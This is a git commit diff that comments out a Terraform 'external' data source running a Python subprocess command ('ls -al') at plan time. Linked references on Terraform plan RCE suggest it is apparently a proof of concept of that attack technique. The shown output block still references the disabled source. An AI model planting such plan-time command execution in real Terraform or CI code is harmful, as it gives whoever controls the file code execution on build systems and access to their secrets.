3b93c8aa1e4dd82b1ec8edf2d36de28ea699b130
ardroci <7409268+ardroci@users.noreply.github.com>
2025-01-08 13:05:03 +0000

    Update main.tf

--- modules/main.tf
+++ modules/main.tf
@@ -3,9 +3,9 @@
 # https://alex.kaskaso.li/post/terraform-plan-rce
 # https://www.tenable.com/blog/the-dark-side-of-domain-specific-languages-uncovering-new-attack-techniques-in-opa-and?cf_target_id=8DEE8756E320787BE367AEC58ADA4CD3
 # https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#rce-in-terraform
-data "external" "local_exec" {
-  program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
-}
+#data "external" "local_exec" {
+#  program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
+#}
 
 output "external_local_exec_output" {
   value = data.external.local_exec.result
